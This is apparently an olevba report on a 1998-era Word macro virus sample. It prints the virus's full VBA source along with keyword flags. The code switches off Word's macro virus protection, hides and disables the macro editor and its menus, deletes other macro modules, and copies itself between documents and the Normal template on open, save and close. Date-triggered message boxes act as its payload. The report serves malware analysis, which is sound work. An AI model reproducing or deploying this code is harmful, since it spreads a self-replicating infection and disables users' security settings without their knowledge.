olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CyberHack-based-b2cebe703bc9f428edfe6078616503276904ced6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CyberHack-based-b2cebe703bc9f428edfe6078616503276904ced6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO LungChen.bas 
in file: Virus.MSWord.CyberHack-based-b2cebe703bc9f428edfe6078616503276904ced6 - OLE stream: 'Macros/VBA/LungChen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Welcome To My Listing Program !
'Created and Programmed By. June 8, 1971
'©April, 1998 - Ciputat
'Sorry, If my program disturbs you !
'It's not danger, I just want to be your friend !

Public Mulai
Public SimpanFile
Public Ay
Public Sun
Sub AyAlways()
    Mulai = Application.DisplayAlerts
    Application.DisplayAlerts = wdAlertsNone
    Call Cek
    WordBasic.DisableAutoMacros 0
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    On Error Resume Next
    CommandBars("Tools").Controls("Macro").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    On Error GoTo 0
End Sub
Sub AyClose()
Application.DisplayAlerts = Mulai
End Sub
Sub AyBirthday()
If Day(Now()) = 8 And Month(Now()) = 6 Then ChenLung.Show
If Day(Now()) = 26 And Month(Now()) = 7 Then MsgBox "Today Is My Wife's Birthday. Happy Birthday Honey !", vbOKOnly, "Happy Birthday To My Wife"
If Day(Now()) = 8 And Month(Now()) = 2 Then MsgBox "Today Is My Wedding's Day. Thank's God !", vbOKOnly, "Happy Wedding"
End Sub
Sub Ay2()
    Call Cek
    On Error GoTo AyErr1
    Ay = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Error1a
    For i = 1 To NT.VBProject.VBComponents.Count
      NMacr = NT.VBProject.VBComponents(i).Name
      If NMacr = "LungChen" Then Ay = True
      If (NMacr <> "LungChen") And (NMacr <> "ChenLung") And (NMacr <> "ThisDocument") Then
        Application.OrganizerDelete Source:=NT.FullName, _
            Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Error1a:
    If Ay = False Then
      On Error GoTo Error1
      Application.OrganizerCopy Source:=AD.FullName, _
          Destination:=NT.FullName, Name:= _
          "LungChen", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=AD.FullName, _
          Destination:=NT.FullName, Name:= _
          "ChenLung", Object:=wdOrganizerObjectProjectItems
      Templates(NT.FullName).Save
Error1:
    End If
AyErr1:
End Sub
Sub Ay2Doc()
    On Error GoTo AyErr2
    SimpanFile = 0
    Sun = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Error2a
    For i = 1 To AD.VBProject.VBComponents.Count
      NMacr = AD.VBProject.VBComponents(i).Name
      If NMacr = "LungChen" Then Sun = True
      NMacr = NT.VBProject.VBComponents(i).Name
      If NMacr = "LungChen" Then Sun = True
      If (NMacr <> "LungChen") And (NMacr <> "ChenLung") And _
        (NMacr <> "ThisDocument") And (NMacr <> "Reference to Normal") Then
        Application.OrganizerDelete Source:=AD.FullName, _
          Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Error2a:
    If Sun = False Then
      On Error GoTo Error2
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=AD.FullName, Name:= _
          "LungChen", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=AD.FullName, Name:= _
          "ChenLung", Object:=wdOrganizerObjectProjectItems
      SimpanFile = 1
Error2:
    End If
AyErr2:
End Sub
Sub Lulung()
    Call AyAlways
    Call Ay2
    Call AyClose
End Sub
Sub Cek()
    With Options
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
End Sub
Sub Simpan()
    On Error GoTo Error4
Set AD = ActiveDocument
    If SimpanFile = 1 Then
       AD.SaveAs FileName:=AD.Name, FileFormat:=wdFormatDocument
    End If
Error4:
End Sub
Sub AutoOpen()
    Call AyBirthday
    Call Lulung
End Sub
Sub FileClose()
    On Error Resume Next
    Call AyAlways
    Call Ay2
    Call Ay2Doc
    Call AyClose
    Call AyBirthday
    WordBasic.FileClose
    Documents.Add
End Sub
Sub FileOpen()
    On Error Resume Next
    Call Lulung
    Dialogs(wdDialogFileOpen).Show
    Call AyAlways
    Call Ay2Doc
    Call Simpan
    Call AyClose
    Call AyBirthday
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call AyAlways
    Call Ay2
    Call Ay2Doc
    Call AyClose
    Dialogs(wdDialogFileSaveAs).Show
    Call AyBirthday
End Sub
Sub FileSave()
    Call AyAlways
    Call Ay2
    Call Ay2Doc
    Call AyClose
    On Error GoTo Errh1
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Call AyBirthday
Errh1:
End Sub
Sub HelpAbout()
    On Error GoTo AyErr3
    ChenLung.Show
AyErr3:
End Sub
Sub ToolsOptions()
    Dialogs(wdDialogToolsOptions).Show
    Call Lulung
    ChenLung.Show
End Sub
Sub FileNew()
    On Error Resume Next
    Call Lulung
    Dialogs(wdDialogFileNew).Show
    Call AyBirthday
End Sub
Sub FileExit()
    Call AyAlways
    Call Ay2
    Call Ay2Doc
    On Error GoTo AyErr4
    Call AyBirthday
AyErr4:
    Call AyClose
    WordBasic.FileExit
End Sub
Sub FileTemplates()
    Call Lulung
    ChenLung.Show
End Sub
Sub ToolsCustomizeKeyboard()
    Call Lulung
    ChenLung.Show
End Sub
Sub ViewVBCode()
    Call Lulung
    ChenLung.Show
End Sub
Sub Organizer()
    ChenLung.Show
End Sub
Sub ToolsMacro()
    Call Lulung
    ChenLung.Show
End Sub
Sub ToolsCustomize()
    Call Lulung
    ChenLung.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO ChenLung.frm 
in file: Virus.MSWord.CyberHack-based-b2cebe703bc9f428edfe6078616503276904ced6 - OLE stream: 'Macros/VBA/ChenLung'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 































Private Sub Image1_Click()
MsgBox "Don't Take My Food ! If You Want It, Ask To Your Mom !", vbOKOnly, "June 08, 1971"
End Sub

Private Sub Image2_Click()
MsgBox "Hei... Don't Click This Area !", vbOKOnly, "June 08, 1971"
End Sub

Private Sub OK_Click()
If Day(Now()) = 8 And Month(Now()) = 6 Then Call Jalan
Unload Me
End Sub

Sub Jalan()
Unload Me
umur = Year(Now()) - 1971
gua$ = "Today Is My Birthday... I'm Now " & umur & " Years Old. Thank's For Your Greeting !" & Chr$(13) & "© April, 1998 - By. June 08, 1971"
MsgBox gua$, vbOKOnly, "Happy Birthday To Me !"
StatusBar = "=> HAPPY Birthday to Me !"
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack-based-b2cebe703bc9f428edfe6078616503276904ced6' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OkeyN	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack-based-b2cebe703bc9f428edfe6078616503276904ced6' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack-based-b2cebe703bc9f428edfe6078616503276904ced6' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack-based-b2cebe703bc9f428edfe6078616503276904ced6' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack-based-b2cebe703bc9f428edfe6078616503276904ced6' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack-based-b2cebe703bc9f428edfe6078616503276904ced6' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack-based-b2cebe703bc9f428edfe6078616503276904ced6' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack-based-b2cebe703bc9f428edfe6078616503276904ced6' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack-based-b2cebe703bc9f428edfe6078616503276904ced6' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?��?����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack-based-b2cebe703bc9f428edfe6078616503276904ced6' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���?�������������������������(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack-based-b2cebe703bc9f428edfe6078616503276904ced6' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack-based-b2cebe703bc9f428edfe6078616503276904ced6' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack-based-b2cebe703bc9f428edfe6078616503276904ced6' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack-based-b2cebe703bc9f428edfe6078616503276904ced6' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack-based-b2cebe703bc9f428edfe6078616503276904ced6' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack-based-b2cebe703bc9f428edfe6078616503276904ced6' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack-based-b2cebe703bc9f428edfe6078616503276904ced6' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?��?����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack-based-b2cebe703bc9f428edfe6078616503276904ced6' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���?�������������������������(
-------------------------------------------------------------------------------
VBA FORM Variable "b'OK'" IN 'Virus.MSWord.CyberHack-based-b2cebe703bc9f428edfe6078616503276904ced6' - OLE stream: 'Macros/ChenLung'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Virus.MSWord.CyberHack-based-b2cebe703bc9f428edfe6078616503276904ced6' - OLE stream: 'Macros/ChenLung'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image2'" IN 'Virus.MSWord.CyberHack-based-b2cebe703bc9f428edfe6078616503276904ced6' - OLE stream: 'Macros/ChenLung'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Image1_Click        |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
